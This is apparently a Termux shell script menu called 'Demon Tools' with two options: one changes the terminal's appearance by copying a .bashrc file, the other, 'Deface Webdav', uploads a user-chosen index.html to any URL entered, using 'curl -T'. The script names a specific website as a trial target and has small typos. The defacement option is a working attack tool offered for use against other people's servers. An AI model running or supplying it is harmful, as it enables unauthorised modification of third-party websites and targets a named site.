#gila_coding
green="\033[32;1m"
yellow="\033[33;1m"
blue="\033[34;1m"
red="\033[35;1m"
clear
sleep 3
echo $red
figlet -f future "Demon Tools" | lolcat
sleep 1
echo $green"Welcome To My Tools"
sleep 1
echo $yellow"Now 2IN1 My Tools"
sleep 1
echo
echo
echo $blue"1 -> Change Face Termux"
echo $blue"2 -> Deface Webdav"
echo $blue"OUT/out -> EXIT"
read -p "@root# " dewa

if [ $dewa = 01 ] || [ $dewa = 1 ]
then
clear
figlet -f future "FACE OF TERMUX" | lolcat
echo
echo $red"Kalian Yakin Mau Mengganti Tampilan Termux?"
echo $yelliw"Y/N"
read -p "@root# " key
fi

if [ $key = Y ] || [ $key = y ]
then
clear
sleep 1
echo $green"PLEASE WAIT...."
cp .bashrc /data/data/com.termux/files/home/
sleep 7
echo $red"SELESAI...."
clear
exit
fi

if [ $key = N ] || [ $key = n ]
then
clear
echo $red
figlet -f future "Demon Tools" | lolcat
sleep 1
echo $green"Welcome To My Tools"
sleep 1
echo $yellow"Now 2IN1 My Tools"
sleep 1
echo
echo
echo $blue"1 -> Change Face Termux"
echo $blue"2 -> Deface Webdav"
read -p "@root# " dewa
fi

if [ $dewa = out ] || [ $dewa = OUT ]
then
clear
echo $blue"Terima Kasih Telah Menggunakan Tools Saya"
echo $red"Contact: 0895635353134"
echo $yellow"Thanks To Indonesia Security Lite"
exit
fi

if [ $dewa = 02 ] || [ $dewa = 2 ]
then
echo
clear
echo $blue
figlet -f future "Deface Webdav"
echo $yellow "Script Ditaruh Diluar Penyimpanan Internal"
echo $red "Target Percobaan"
echo $yellow "http://contsol.co.za"
echo
echo $blue "masukan url"
echo $yellow
read -p "-->$" link
echo
echo $blue "Masukan Nama Script"
echo $green "nama script harus index.html"
echo $yellow
read -p "-->$" html
echo $red
echo
curl -T /storage/emulated/0/$html $link
echo $red"Deface Web"$yellow"-->"$green"$link/$html"
echo
ech
echo $red"Tools Akan Mulai Lagi Dalam 10detik"
sleep 10
sh Demon2in1.sh
fi